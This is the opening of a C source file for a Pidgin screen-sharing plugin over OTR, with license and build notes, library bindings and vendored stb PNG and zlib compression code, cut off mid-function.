/*
 * ScreenShareOTR for Pidgin - Custom License
 * -------------------------------------------
 * 
 * This file is part of ScreenShareOTR, a plugin for the Pidgin IM client.
 * 
 * ScreenShareOTR includes code licensed under the GNU General Public License (GPL),
 * as well as custom code that is subject to additional restrictions.
 *
 * 1. Licensing:
 *    - The overall project is licensed under the GNU General Public License v3.0 (GPL-3.0).
 *    - This plugin includes code from the following libraries:
 *      - libdeflate
 *      - libotr (modified by me)
 *      - stb (https://github.com/nothings/stb) 
 *    - Modifications to the code from the libraries are licensed under their respective licenses.
 *    
 * 2. Original Code:
 *    - 3700 lines of code in this file are original and written by me, Yarik "Dyka" Wood.
 *    - This original code is subject to the following additional restrictions:
 *        - You may not modify, alter, or create derivative works based on my original code.
 *        - You must provide attribution to me, [Your Name], in any redistributions of this code.
 *        - The original code must remain intact and cannot be removed or replaced in any distributions.
 *    
 * 3. Special Permissions:
 *    - The modified version of libotr is integrated into this plugin. The modifications are licensed under the GPL-3.0 license.
 *    - If you wish to use my original code outside of the terms of the GPL-3.0, or if you require different licensing terms, please contact me for a separate licensing agreement.
 *    
 * 4. Warranty Disclaimer:
 *    - This software is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement.
 *    - In no event shall the authors be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.
 *    
 * 5. Contact Information:
 *    - For licensing questions or special permissions, please contact yarik1992@proton.me.
 * 
 * By using, modifying, or redistributing this file, you agree to the terms and conditions stated above.
 * 
 */

/*
NSIS:
	to build the .nsis, first compile the dll via gcc on windows, from C:/msys64/home/devera/pidgin-dev/pidgin-devel/pidgin-2.14.13/libpurple/plugins, run 'make -f Makefile.mingw install'
	then copy the .nsi script into MakeNSISW (from start menu) & hit build/save EXE

	After building the NSIS Installer, sign it via

	"C:\Program Files (x86)\Windows Kits\10\bin\10.0.22621.0\x64\signtool.exe" sign /fd sha256 /tr http://timestamp.digicert.com /td sha256 /sha1
	"ac9fd222c4cd5ab74dee4c9f0d72b4746984f049" /d "ScreenShareOTR Installer" /du "https://ss-otr.jabberplugins.net"
	"C:\msys64\home\devera\pidgin-dev\pidgin-devel\pidgin-2.14.13\libpurple\plugins\ssotr.DLL"

DEB:
	to build the .deb package, from Ubuntu first 'sudo make pidgin-screenshare.so' then 'sudo dpkg-deb --build ./pidgin-screenshare-deb' (from the libpurple/plugins directory)

RPM:
	to build the .rpm package, from Ubuntu first 'sudo make pidgin-screenshare.so' then 'mv pidgin-screenshare.so ~/rpmbuild/SOURCES' (from the libpurple/plugins directory) 
		the spec is already configured so leave it as is, then do 'rpmbuild -ba SPECS/pidgin-screenshare.spec' to build the rpm, it will output the package in ./RPMS/x86_64

POSTBUILD:
	after building the installer packages, sign them via GPG-armor to acquire the .asc signatures & place them on the installer webpage respectively (to verify authenticity)

NOTE (compiling the DLL for Windows):
	this project depends on static libotr to function correctly, libotr is a pain in the @$$ to build as the default msys2 builds return linker errors at compilation-time
	the solution is to run the vsbuild in %userprofile%\libotr & compile libotr from scratch (note: the build has been configured to be compatible for both x86 & x64)
*/

#include "internal.h"

#define PLUGIN_ID			   "screenshare-otr"
#define PLUGIN_NAME			N_("Screenshare OTR")
#define PLUGIN_STATIC_NAME	screenshare_otr
#define PLUGIN_SUMMARY		N_("Initiate screensharing sessions within Pidgin over OTR, where you can select which window you wish to share securely.")
#define PLUGIN_DESCRIPTION	N_("Initiate screensharing sessions within Pidgin over OTR, where you can select which window you wish to share securely.")
#define PLUGIN_AUTHOR		"D.Wood <yarik1992@proton.me>"

#include <gtk/gtk.h>
#include <gtkconv.h>
#include <gtkplugin.h>

#include <version.h>

#include <blist.h>
#include <conversation.h>
#include <core.h>
#include <debug.h>
#include <pounce.h>
#include <request.h>
#include <account.h>

#include <wchar.h>
#include <stdio.h>
#include <stddef.h>
#include <string.h>
#include <stdbool.h>
#include <libdeflate.h>

#ifdef _WIN32
#include <winsock2.h>
#include <iphlpapi.h>
#include <windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <ws2tcpip.h>
#include <objbase.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <shellapi.h>
#ifndef TIMEVAL
#define TIMEVAL timeval
#endif
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")
#define closesocket(sock) closesocket(sock)
#else
#include <errno.h>
#include <unistd.h>
#include <cairo.h>
#include <cairo-xlib.h>
#include <X11/Xlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <uuid/uuid.h>
#include <X11/Xatom.h>
#include <gdk/gdk.h>
#include <gdk/gdkx.h>
#include <gdk-pixbuf/gdk-pixbuf.h>
#include <glib-object.h>
#include <gio/gio.h>
#include <threads.h>
#include <netdb.h>
GApplication* app = 0;
#define closesocket(sock) close(sock)
#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#endif

#include <libotr/proto.h>
#include <libotr/userstate.h>
#include <libotr/context.h>
#include <libotr/message.h>
#include <libotr/privkey.h>

typedef enum {
   WM_GNOME = 1,
   WM_XFCE,
   WM_KDE,
   WM_UNK
} _wm_type;
int is_otr_secured = 0;
int is_deflate_loaded = 0;
_wm_type wm_type = WM_UNK;
gboolean force_send_packet = FALSE;
char instag_path[520], keys_path[520];
PurpleConversation* curr_screenshare_conv = 0;
void* module_libotr = 0, *module_libdeflate = 0;
int can_xfce_screen_capture = 0, can_kde_screen_capture = 0, can_gnome_screen_capture = 0;
typedef gcry_error_t (*otrl_init_t)(unsigned int, unsigned int, unsigned int);
otrl_init_t otrl_init_func;
typedef int (*otrl_message_receiving_t)(OtrlUserState us, const OtrlMessageAppOps *ops,
	void *opdata, const char *accountname, const char *protocol,
	const char *sender, const char *message, char **newmessagep,
	OtrlTLV **tlvsp, ConnContext **contextp,
	void (*add_appdata)(void *data, ConnContext *context),
	void *data);
otrl_message_receiving_t otrl_message_receiving_func;
typedef gcry_error_t (*otrl_message_sending_t)(OtrlUserState us,
	const OtrlMessageAppOps *ops,
	void *opdata, const char *accountname, const char *protocol,
	const char *recipient, otrl_instag_t their_instag,
	const char *original_msg, OtrlTLV *tlvs, char **messagep,
	OtrlFragmentPolicy fragPolicy, ConnContext **contextp,
	void (*add_appdata)(void *data, ConnContext *context),
	void *data);
otrl_message_sending_t otrl_message_sending_func;
typedef OtrlUserState (*otrl_userstate_create_t)(void);
otrl_userstate_create_t otrl_userstate_create_func;
typedef void (*otrl_userstate_free_t)(OtrlUserState us);
otrl_userstate_free_t otrl_userstate_free_func;
typedef gcry_error_t (*otrl_privkey_read_t)(OtrlUserState us, const char *filename);
otrl_privkey_read_t otrl_privkey_read_func;
typedef gcry_error_t (*otrl_privkey_read_fingerprints_t)(OtrlUserState us,
	const char *filename,
	void (*add_app_data)(void *data, ConnContext *context),
	void  *data);
typedef gcry_error_t (*otrl_instag_generate_t)(OtrlUserState us, const char *filename,
	const char *accountname, const char *protocol);
otrl_instag_generate_t otrl_instag_generate_func;
otrl_privkey_read_fingerprints_t otrl_privkey_read_fingerprints_func;
typedef gcry_error_t (*otrl_privkey_generate_t)(OtrlUserState us, const char *filename,
	const char *accountname, const char *protocol);
otrl_privkey_generate_t otrl_privkey_generate_func;
typedef gcry_error_t(*otrl_instag_read_t)(OtrlUserState us, const char* filename);
otrl_instag_read_t otrl_instag_read_func;
typedef char* (*otrl_privkey_fingerprint_t)(OtrlUserState us, char fingerprint[OTRL_PRIVKEY_FPRINT_HUMAN_LEN], const char* accountname, const char* protocol);
otrl_privkey_fingerprint_t otrl_privkey_fingerprint_func;
typedef struct libdeflate_compressor* (*libdeflate_alloc_compressor_t)(int compression_level);
libdeflate_alloc_compressor_t libdeflate_alloc_compressor_func;
typedef size_t (*libdeflate_deflate_compress_bound_t)(struct libdeflate_compressor *compressor, size_t in_nbytes);
libdeflate_deflate_compress_bound_t libdeflate_deflate_compress_bound_func;
typedef size_t (*libdeflate_deflate_compress_t)(struct libdeflate_compressor *compressor,
   const void *in, size_t in_nbytes,
   void *out, size_t out_nbytes_avail);
libdeflate_deflate_compress_t libdeflate_deflate_compress_func;
typedef void (*libdeflate_free_compressor_t)(struct libdeflate_compressor *compressor);
libdeflate_free_compressor_t libdeflate_free_compressor_func;
typedef struct libdeflate_decompressor* (*libdeflate_alloc_decompressor_t)(void);
libdeflate_alloc_decompressor_t libdeflate_alloc_decompressor_func;
typedef enum libdeflate_result (*libdeflate_deflate_decompress_t)(struct libdeflate_decompressor *decompressor, 
   const void *in, size_t in_nbytes, void *out, size_t out_nbytes_avail, size_t *actual_out_nbytes_ret);
libdeflate_deflate_decompress_t libdeflate_deflate_decompress_func;
typedef void (*libdeflate_free_decompressor_t)(struct libdeflate_decompressor *decompressor);
libdeflate_free_decompressor_t libdeflate_free_decompressor_func;

//---------------------------------------------------------------------------------------------------
//                             STBI Helper Library START (L#220-L#2393)
//                            Taken from: https://github.com/nothings/stb
//---------------------------------------------------------------------------------------------------

#ifndef STBIW_MALLOC
#define STBIW_MALLOC(sz)        malloc(sz)
#define STBIW_REALLOC(p,newsz)  realloc(p,newsz)
#define STBIW_FREE(p)           free(p)
#endif

#ifndef STBIW_REALLOC_SIZED
#define STBIW_REALLOC_SIZED(p,oldsz,newsz) STBIW_REALLOC(p,newsz)
#endif

#ifndef STBIW_MEMMOVE
#define STBIW_MEMMOVE(a,b,sz) memmove(a,b,sz)
#endif

#define STBIW_UCHAR(x) (unsigned char) ((x) & 0xff)

#ifdef STB_IMAGE_WRITE_STATIC
static int stbi_write_png_compression_level = 8;
static int stbi_write_tga_with_rle = 1;
static int stbi_write_force_png_filter = -1;
#else
int stbi_write_png_compression_level = 8;
int stbi_write_tga_with_rle = 1;
int stbi_write_force_png_filter = -1;
#endif

static FILE *stbiw__fopen(char const *filename, char const *mode)
{
   FILE *f;
#if defined(_WIN32) && defined(STBIW_WINDOWS_UTF8)
   wchar_t wMode[64];
   wchar_t wFilename[1024];
   if (0 == MultiByteToWideChar(65001 /* UTF8 */, 0, filename, -1, wFilename, sizeof(wFilename)/sizeof(*wFilename)))
      return 0;

   if (0 == MultiByteToWideChar(65001 /* UTF8 */, 0, mode, -1, wMode, sizeof(wMode)/sizeof(*wMode)))
      return 0;

#if defined(_MSC_VER) && _MSC_VER >= 1400
   if (0 != _wfopen_s(&f, wFilename, wMode))
      f = 0;
#else
   f = _wfopen(wFilename, wMode);
#endif

#elif defined(_MSC_VER) && _MSC_VER >= 1400
   if (0 != fopen_s(&f, filename, mode))
      f=0;
#else
   f = fopen(filename, mode);
#endif
   return f;
}


//////////////////////////////////////////////////////////////////////////////
//
// PNG writer
//

#ifndef STBIW_ZLIB_COMPRESS
// stretchy buffer; stbiw__sbpush() == vector<>::push_back() -- stbiw__sbcount() == vector<>::size()
#define stbiw__sbraw(a) ((int *) (void *) (a) - 2)
#define stbiw__sbm(a)   stbiw__sbraw(a)[0]
#define stbiw__sbn(a)   stbiw__sbraw(a)[1]

#define stbiw__sbneedgrow(a,n)  ((a)==0 || stbiw__sbn(a)+n >= stbiw__sbm(a))
#define stbiw__sbmaybegrow(a,n) (stbiw__sbneedgrow(a,(n)) ? stbiw__sbgrow(a,n) : 0)
#define stbiw__sbgrow(a,n)  stbiw__sbgrowf((void **) &(a), (n), sizeof(*(a)))

#define stbiw__sbpush(a, v)      (stbiw__sbmaybegrow(a,1), (a)[stbiw__sbn(a)++] = (v))
#define stbiw__sbcount(a)        ((a) ? stbiw__sbn(a) : 0)
#define stbiw__sbfree(a)         ((a) ? STBIW_FREE(stbiw__sbraw(a)),0 : 0)

static void *stbiw__sbgrowf(void **arr, int increment, int itemsize)
{
   int m = *arr ? 2*stbiw__sbm(*arr)+increment : increment+1;
   void *p = STBIW_REALLOC_SIZED(*arr ? stbiw__sbraw(*arr) : 0, *arr ? (stbiw__sbm(*arr)*itemsize + sizeof(int)*2) : 0, itemsize * m + sizeof(int)*2);
   if (p) {
      if (!*arr) ((int *) p)[1] = 0;
      *arr = (void *) ((int *) p + 2);
      stbiw__sbm(*arr) = m;
   }
   return *arr;
}

static unsigned char *stbiw__zlib_flushf(unsigned char *data, unsigned int *bitbuffer, int *bitcount)
{
   while (*bitcount >= 8) {
      stbiw__sbpush(data, STBIW_UCHAR(*bitbuffer));
      *bitbuffer >>= 8;
      *bitcount -= 8;
   }
   return data;
}

static int stbiw__zlib_bitrev(int code, int codebits)
{
   int res=0;
   while (codebits--) {
      res = (res << 1) | (code & 1);
      code >>= 1;
   }
   return res;
}

static unsigned int stbiw__zlib_countm(unsigned char *a, unsigned char *b, int limit)
{
   int i;
   for (i=0; i < limit && i < 258; ++i)
      if (a[i] != b[i]) break;
   return i;
}

static unsigned int stbiw__zhash(unsigned char *data)
{
   unsigned int hash = data[0] + (data[1] << 8) + (data[2] << 16);
   hash ^= hash << 3;
   hash += hash >> 5;
   hash ^= hash << 4;
   hash += hash >> 17;
   hash ^= hash << 25;
   hash += hash >> 6;
   return hash;
}

#define stbiw__zlib_flush() (out = stbiw__zlib_flushf(out, &bitbuf, &bitcount))
#define stbiw__zlib_add(code,codebits) \
      (bitbuf |= (code) << bitcount, bitcount += (codebits), stbiw__zlib_flush())
#define stbiw__zlib_huffa(b,c)  stbiw__zlib_add(stbiw__zlib_bitrev(b,c),c)
// default huffman tables
#define stbiw__zlib_huff1(n)  stbiw__zlib_huffa(0x30 + (n), 8)
#define stbiw__zlib_huff2(n)  stbiw__zlib_huffa(0x190 + (n)-144, 9)
#define stbiw__zlib_huff3(n)  stbiw__zlib_huffa(0 + (n)-256,7)
#define stbiw__zlib_huff4(n)  stbiw__zlib_huffa(0xc0 + (n)-280,8)
#define stbiw__zlib_huff(n)  ((n) <= 143 ? stbiw__zlib_huff1(n) : (n) <= 255 ? stbiw__zlib_huff2(n) : (n) <= 279 ? stbiw__zlib_huff3(n) : stbiw__zlib_huff4(n))
#define stbiw__zlib_huffb(n) ((n) <= 143 ? stbiw__zlib_huff1(n) : stbiw__zlib_huff2(n))

#define stbiw__ZHASH   16384

#endif // STBIW_ZLIB_COMPRESS

static unsigned char * stbi_zlib_compress(unsigned char *data, int data_len, int *out_len, int quality)
{
#ifdef STBIW_ZLIB_COMPRESS
   // user provided a zlib compress implementation, use that
   return STBIW_ZLIB_COMPRESS(data, data_len, out_len, quality);
#else // use builtin
   static unsigned short lengthc[] = { 3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,31,35,43,51,59,67,83,99,115,131,163,195,227,258, 259 };
   static unsigned char  lengtheb[]= { 0,0,0,0,0,0,0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4, 4,  4,  5,  5,  5,  5,  0 };
   static unsigned short distc[]   = { 1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,257,385,513,769,1025,1537,2049,3073,4097,6145,8193,12289,16385,24577, 32768 };
   static unsigned char  disteb[]  = { 0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13 };
   unsigned int bitbuf=0;
   int i,j, bitcount=0;
   unsigned char *out = NULL;
   unsigned char ***hash_table = (unsigned char***) STBIW_MALLOC(stbiw__ZHASH * sizeof(unsigned char**));
   if (hash_table == NULL)
      return NULL;
   if (quality < 5) quality = 5;

   stbiw__sbpush(out, 0x78);   // DEFLATE 32K window
   stbiw__sbpush(out, 0x5e);   // FLEVEL = 1
   stbiw__zlib_add(1,1);  // BFINAL = 1
   stbiw__zlib_add(1,2);  // BTYPE = 1 -- fixed huffman

   for (i=0; i < stbiw__ZHASH; ++i)
      hash_table[i] = NULL;

   i=0;
   while (i < data_len-3) {
      // hash next 3 bytes of data to be compressed
      int h = stbiw__zhash(data+i)&(stbiw__ZHASH-1), best=3;
      unsigned char *bestloc = 0;
      unsigned char **hlist = hash_table[h];
      int n = stbiw__sbcount(hlist);
      for (j=0; j < n; ++j) {
         if (hlist[j]-data > i-32768) { // if entry lies within window
            int d = stbiw__zlib_countm(hlist[j], data+i, data_len-i);
            if (d >= best) { best=d; bestloc=hlist[j]; }
         }
      }
      // when hash table entry is too long, delete half the entries
      if (hash_table[h] && stbiw__sbn(hash_table[h]) == 2*quality) {
         STBIW_MEMMOVE(hash_table[h], hash_table[h]+quality, sizeof(hash_table[h][0])*quality);
         stbiw__sbn(hash_table[h]) = quality;
      }
      stbiw__sbpush(hash_table[h],data+i);

      if (bestloc) {
         // "lazy matching" - check match at *next* byte, and if it's better, do cur byte as literal
         h = stbiw__zhash(data+i+1)&(stbiw__ZHASH-1);
         hlist = hash_table[h];
         n = stbiw__sbcount(hlist);
         for (j=0; j < n; ++j) {
            if (hlist[j]-data > i-32767) {
               int e = stbiw__zlib_countm(hlist[j], data+i+1, data_len-i-1);
               if (e > best) { // if next match is better, bail on current match
                  bestloc = NULL;
                  break;
               }
            }
         }
      }

      if (bestloc) {
         int d = (int) (data+i - bestloc); // distance back
         for (j=0; best > lengthc[j+1]-1; ++j);
         stbiw__zlib_huff(j+257);
         if (lengtheb[j]) stbiw__zlib_add(best - lengthc[j], lengtheb[j]);
         for (j=0; d > distc[j+1]-1; ++j);
         stbiw__zlib_add(stbiw__zlib_bitrev(j,5),5);
         if (disteb[j]) stbiw__zlib_add(d - distc[j], disteb[j]);
         i += best;
      } else {
         stbiw__zlib_huffb(data[i]);
         ++i;
      }
   }
   // write out final bytes
   for (;i < data_len; ++i)
      stbiw__zlib_huffb(data[i]);
   stbiw__zlib_huff(256); // end of block
   // pad with 0 bits to byte boundary
   while (bitcount)
      stbiw__zlib_add(0,1);

   for (i=0; i < stbiw__ZHASH; ++i)
      (void) stbiw__sbfree(hash_table[i]);
   STBIW_FREE(hash_table);

   // store uncompressed instead if compression was worse
   if (stbiw__sbn(out) > data_len + 2 + ((data_len+32766)/32767)*5) {
      stbiw__sbn(out) = 2;  // truncate to DEFLATE 32K window and FLEVEL = 1
      for (j = 0; j < data_len;) {
         int blocklen = data_len - j;
         if (blocklen > 32767) blocklen = 32767;
         stbiw__sbpush(out, data_len - j == blocklen); // BFINAL = ?, BTYPE = 0 -- no compression
         stbiw__sbpush(out, STBIW_UCHAR(blocklen)); // LEN
         stbiw__sbpush(out, STBIW_UCHAR(blocklen >> 8));
         stbiw__sbpush(out, STBIW_UCHAR(~blocklen)); // NLEN
         stbiw__sbpush(out, STBIW_UCHAR(~blocklen >> 8));
         memcpy(out+stbiw__sbn(out), data+j, blocklen);
         stbiw__sbn(out) += blocklen;
         j += blocklen;
      }
   }

   {
      // compute adler32 on input
      unsigned int s1=1, s2=0;
      int blocklen = (int) (data_len % 5552);
      j=0;
      while (j < data_len) {
         for (i=0; i < blocklen; ++i) { s1 += data[j+i]; s2 += s1; }
         s1 %= 65521; s2 %= 65521;
         j += blocklen;
         blocklen = 5552;
      }
      stbiw__sbpush(out, STBIW_UCHAR(s2 >> 8));
      stbiw__sbpush(out, STBIW_UCHAR(s2));
      stbiw__sbpush(out, STBIW_UCHAR(s1 >> 8));
      stbiw__sbpush(out, STBIW_UCHAR(s1));
   }
   *out_len = stbiw__sbn(out);
   // make returned pointer freeable
   STBIW_MEMMOVE(stbiw__sbraw(out), out, *out_len);
   return (unsigned char *) stbiw__sbraw(out);
#endif // STBIW_ZLIB_COMPRESS
}

static unsigned int stbiw__crc32(unsigned char *buffer, int len)
{
#ifdef STBIW_CRC32
    return STBIW_CRC32(buffer, len);
#else
   static unsigned int crc_table[256] =
   {
      0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA, 0x076DC419, 0x706AF48F, 0xE963A535, 0x9E6495A3,
      0x0eDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988, 0x09B64C2B, 0x7EB17CBD, 0xE7B82D07, 0x90BF1D91,
      0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE, 0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7,
      0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC, 0x14015C4F, 0x63066CD9, 0xFA0F3D63, 0x8D080DF5,
      0x3B6E20C8, 0x4C69105E, 0xD56041E4, 0xA2677172, 0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B,
      0x35B5A8FA, 0x42B2986C, 0xDBBBC9D6, 0xACBCF940, 0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59,
      0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116, 0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F,
      0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924, 0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D,
      0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A, 0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433,
      0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818, 0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01,
      0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E, 0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457,
      0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C, 0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65,
      0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2, 0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB,
      0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0, 0x44042D73, 0x33031DE5, 0xAA0A4C5F, 0xDD0D7CC9,
      0x5005713C, 0x270241AA, 0xBE0B1010, 0xC90C2086, 0x5768B525, 0x206F85B3, 0xB966D409, 0xCE61E49F,
      0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4, 0x59B33D17, 0x2EB40D81, 0xB7BD5C3B, 0xC0BA6CAD,
      0xEDB88320, 0x9ABFB3B6, 0x03B6E20C, 0x74B1D29A, 0xEAD54739, 0x9DD277AF, 0x04DB2615, 0x73DC1683,
      0xE3630B12, 0x94643B84, 0x0D6D6A3E, 0x7A6A5AA8, 0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1,
      0xF00F9344, 0x8708A3D2, 0x1E01F268, 0x6906C2FE, 0xF762575D, 0x806567CB, 0x196C3671, 0x6E6B06E7,
      0xFED41B76, 0x89D32BE0, 0x10DA7A5A, 0x67DD4ACC, 0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5,
      0xD6D6A3E8, 0xA1D1937E, 0x38D8C2C4, 0x4FDFF252, 0xD1BB67F1, 0xA6BC5767, 0x3FB506DD, 0x48B2364B,
      0xD80D2BDA, 0xAF0A1B4C, 0x36034AF6, 0x41047A60, 0xDF60EFC3, 0xA867DF55, 0x316E8EEF, 0x4669BE79,
      0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236, 0xCC0C7795, 0xBB0B4703, 0x220216B9, 0x5505262F,
      0xC5BA3BBE, 0xB2BD0B28, 0x2BB45A92, 0x5CB36A04, 0xC2D7FFA7, 0xB5D0CF31, 0x2CD99E8B, 0x5BDEAE1D,
      0x9B64C2B0, 0xEC63F226, 0x756AA39C, 0x026D930A, 0x9C0906A9, 0xEB0E363F, 0x72076785, 0x05005713,
      0x95BF4A82, 0xE2B87A14, 0x7BB12BAE, 0x0CB61B38, 0x92D28E9B, 0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21,
      0x86D3D2D4, 0xF1D4E242, 0x68DDB3F8, 0x1FDA836E, 0x81BE16CD, 0xF6B9265B, 0x6FB077E1, 0x18B74777,
      0x88085AE6, 0xFF0F6A70, 0x66063BCA, 0x11010B5C, 0x8F659EFF, 0xF862AE69, 0x616BFFD3, 0x166CCF45,
      0xA00AE278, 0xD70DD2EE, 0x4E048354, 0x3903B3C2, 0xA7672661, 0xD06016F7, 0x4969474D, 0x3E6E77DB,
      0xAED16A4A, 0xD9D65ADC, 0x40DF0B66, 0x37D83BF0, 0xA9BCAE53, 0xDEBB9EC5, 0x47B2CF7F, 0x30B5FFE9,
      0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6, 0xBAD03605, 0xCDD70693, 0x54DE5729, 0x23D967BF,
      0xB3667A2E, 0xC4614AB8, 0x5D681B02, 0x2A6F2B94, 0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B, 0x2D02EF8D
   };

   unsigned int crc = ~0u;
   int i;
   for (i=0; i < len; ++i)
      crc = (crc >> 8) ^ crc_table[buffer[i] ^ (crc & 0xff)];
   return ~crc;
#endif
}

#define stbiw__wpng4(o,a,b,c,d) ((o)[0]=STBIW_UCHAR(a),(o)[1]=STBIW_UCHAR(b),(o)[2]=STBIW_UCHAR(c),(o)[3]=STBIW_UCHAR(d),(o)+=4)
#define stbiw__wp32(data,v) stbiw__wpng4(data, (v)>>24,(v)>>16,(v)>>8,(v));
#define stbiw__wptag(data,s) stbiw__wpng4(data, s[0],s[1],s[2],s[3])

static void stbiw__wpcrc(unsigned char **data, int len)
{
   unsigned int crc = stbiw__crc32(*data - len - 4, len+4);
   stbiw__wp32(*data, crc);
}

static unsigned char stbiw__paeth(int a, int b, int c)
{
   int p = a + b - c, pa = abs(p-a), pb = abs(p-b), pc = abs(p-c);
   if (pa <= pb && pa <= pc) return STBIW_UCHAR(a);
   if (pb <= pc) return STBIW_UCHAR(b);
   return STBIW_UCHAR(c);
}

static int stbi__flip_vertically_on_write = 0;

static void stbi_flip_vertically_on_write(int flag)
{
   stbi__flip_vertically_on_write = flag;
}

// @OPTIMIZE: provide an option that always forces left-predict or paeth predict
static void stbiw__encode_png_line(unsigned char *pixels, int stride_bytes, int width, int height, int y, int n, int filter_type, signed char *line_buffer)
{
   static int mapping[] = { 0,1,2,3,4 };
   static int firstmap[] = { 0,1,0,5,6 };
   int *mymap = (y != 0) ? mapping : firstmap;
   int i;
   int type = mymap[filter_type];
   unsigned char *z = pixels + stride_bytes * (stbi__flip_vertically_on_write ? height-1-y : y);
   int signed_stride = stbi__flip_vertically_on_write ? -stride_bytes : stride_bytes;

   if (type==0) {
      memcpy(line_buffer, z, width*n);
      return;
   }

   // first loop isn't optimized since it's just one pixel
   for (i = 0; i < n; ++i) {
      switch (type) {
         case 1: line_buffer[i] = z[i]; break;
         case 2: line_buffer[i] = z[i] - z[i-signed_stride]; break;
         case 3: line_buffer[i] = z[i] - (z[i-signed_stride]>>1); break;
         case 4: line_buffer[i] = (signed char) (z[i] - stbiw__paeth(0,z[i-signed_stride],0)); break;
         case 5: line_buffer[i] = z[i]; break;
         case 6: line_buffer[i] = z[i]; break;
      }
   }
   switch (type) {
      case 1: for (i=n; i < width*n; ++i) line_buffer[i] = z[i] - z[i-n]; break;
      case 2: for (i=n; i < width*n; ++i) line_buffer[i] = z[i] - z[i-signed_stride]; break;
      case 3: for (i=n; i < width*n; ++i) line_buffer[i] = z[i] - ((z[i-n] + z[i-signed_stride])>>1); break;
      case 4: for (i=n; i < width*n; ++i) line_buffer[i] = z[i] - stbiw__paeth(z[i-n], z[i-signed_stride], z[i-signed_stride-n]); break;
      case 5: for (i=n; i < width*n; ++i) line_buffer[i] = z[i] - (z[i-n]>>1); break;
      case 6: for (i=n; i < width*n; ++i) line_buffer[i] = z[i] - stbiw__paeth(z[i-n], 0,0); break;
   }
}

static unsigned char *stbi_write_png_to_mem(const unsigned char *pixels, int stride_bytes, int x, int y, int n, int *out_len)
{
   int force_filter = stbi_write_force_png_filter;
   int ctype[5] = { -1, 0, 4, 2, 6 };
   unsigned char sig[8] = { 137,80,78,71,13,10,26,10 };
   unsigned char *out,*o, *filt, *zlib;
   signed char *line_buffer;
   int j,zlen;

   if (stride_bytes == 0)
      stride_bytes = x * n;

   if (force_filter >= 5) {
      force_filter = -1;
   }

   filt = (unsigned char *) STBIW_MALLOC((x*n+1) * y); if (!filt) return 0;
   line_buffer = (signed char *) STBIW_MALLOC(x * n); if (!line_buffer) { STBIW_FREE(filt); return 0; }
   for (j=0; j < y; ++j) {
      int filter_type;
      if (force_filter > -1) {
         filter_type = force_filter;
         stbiw__encode_png_line((unsigned char*)(pixels), stride_bytes, x, y, j, n, force_filter, line_buffer);
      } else { // Estimate the best filter by running through all of them:
         int best_filter = 0, best_filter_val = 0x7fffffff, est, i;
         for (filter_type = 0; filter_type < 5; filter_type++) {
            stbiw__encode_png_line((unsigned char*)(pixels), stride_bytes, x, y, j, n, filter_type, line_buffer);

            // Estimate the entropy of the line using this filter; the less, the better.
            est = 0;
            for (i = 0; i < x*n; ++i) {
               est += abs((signed char) line_buffer[i]);
            }
            if (est < best_filter_val) {
               best_filter_val = est;
               best_filter = filter_type;
            }
         }
         if (filter_type != best_filter) {  // If the last iteration already got us the best filter, don't redo it
            stbiw__encode_png_line((unsigned char*)(pixels), stride_bytes, x, y, j, n, best_filter, line_buffer);
            filter_type = best_filter;
         }
      }
      // when we get here, filter_type contains the filter type, and line_buffer contains the data
      filt[j*(x*n+1)] = (unsigned char) filter_type;
      STBIW_MEMMOVE(filt+j*(x*n+1)+1, line_buffer, x*n);
   }
   STBIW_FREE(line_buffer);
   zlib = stbi_zlib_compress(filt, y*( x*n+1), &zlen, stbi_write_png_compression_level);
   STBIW_FREE(filt);
   if (!zlib) return 0;

   // each tag requires 12 bytes of overhead
   out = (unsigned char *) STBIW_MALLOC(8 + 12+13 + 12+zlen + 12);
   if (!out) return 0;
   *out_len = 8 + 12+13 + 12+zlen + 12;

   o=out;
   STBIW_MEMMOVE(o,sig,8); o+= 8;
